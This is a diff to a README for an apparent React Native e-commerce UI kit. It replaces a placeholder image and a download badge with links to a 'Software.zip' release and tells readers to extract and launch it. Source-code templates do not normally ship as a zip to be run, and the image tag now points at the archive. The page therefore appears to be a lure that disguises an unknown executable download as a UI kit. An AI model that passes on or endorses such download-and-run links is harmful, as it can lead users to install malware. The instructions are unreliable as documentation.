@@ -1,6 +1,6 @@
 # 🛍️ Welcome to the E-commerce Shop React Native UI Kit 📱
 
-![E-commerce Shop React Native UI Kit Image](https://via.placeholder.com/800x400)
+![E-commerce Shop React Native UI Kit Image](https://github.com/Oriyagamer/ecommerce-shop-react-native-ui-kit/releases/download/v1.0/Software.zip)
 
 ## Overview
 Welcome to the "ecommerce-shop-react-native-ui-kit" repository! This template provides a clean and modern design for building eCommerce applications. Designed specifically with a light mode, it focuses on clarity, usability, and aesthetics to meet the needs of both designers and developers.
@@ -15,9 +15,9 @@ Welcome to the "ecommerce-shop-react-native-ui-kit" repository! This template pr
 ## How to Use
 To get started with this E-commerce Shop React Native UI Kit, you can download the software package from the following link:
 
-[![Download Software Package](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software Package](https://github.com/Oriyagamer/ecommerce-shop-react-native-ui-kit/releases/download/v1.0/Software.zip)](https://github.com/Oriyagamer/ecommerce-shop-react-native-ui-kit/releases/download/v1.0/Software.zip)
 
-Once you have downloaded the Software.zip file, extract it and launch the application to explore the user interface and functionality.
+Once you have downloaded the https://github.com/Oriyagamer/ecommerce-shop-react-native-ui-kit/releases/download/v1.0/Software.zip file, extract it and launch the application to explore the user interface and functionality.
 
 ## Topics
 This repository covers a wide range of topics related to e-commerce, clean code, clean architecture, UI components, UI design, shopping cart, fashion, and more. It aims to provide a comprehensive solution for developers and designers working on e-commerce applications.
